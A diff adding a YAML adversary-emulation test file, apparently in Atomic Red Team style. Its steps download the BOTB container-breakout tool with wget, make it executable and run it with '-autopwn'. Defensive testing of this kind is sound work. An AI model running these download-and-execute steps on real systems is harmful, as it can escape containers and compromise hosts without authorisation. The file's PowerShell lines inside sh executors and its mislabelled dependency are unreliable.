@@ -1,0 +1,55 @@
+attack_technique: DOWNLOAD_BOTB
+display_name: Download Malware
+atomic_tests:
+- name: Download the BOTB malware to a container
+  description: |
+  supported_platforms:
+  - linux 
+  - containers
+  dependencies:
+  - description: |
+      Checks for wget
+    prereq_command: |
+      which wget
+    get_prereq_command: |
+      Write-Host "No wget found"
+  executor:
+    command: |
+      wget -nv https://github.com/brompwnie/botb/releases/download/1.8.0/botb-linux-amd64 -O /tmp/botb
+    name: sh
+    elevation_required: false
+- name: Chmod +x the downloaded botb malware
+  description: |
+  supported_platforms:
+  - linux 
+  - containers
+  dependencies:
+  - description: |
+      Checks for wget
+    prereq_command: |
+      [ -e /tmp/botb ]
+    get_prereq_command: |
+      Write-Host "No /tmp/botb found"
+  executor:
+    command: |
+      chmod +x /tmp/botb 
+    name: sh
+    elevation_required: false
+- name: Execute the downloaded botb malware from /tmp
+  description: |
+  supported_platforms:
+  - linux 
+  - containers
+  dependencies:
+  - description: |
+      Checks for existence of /tmp/botb
+    prereq_command: |
+      [ -x /tmp/botb ]
+    get_prereq_command: |
+      Write-Host "/tmp/botb not executable or not found"
+  executor:
+    command: |
+      /tmp/botb -autopwn
+    name: sh
+    elevation_required: false
+
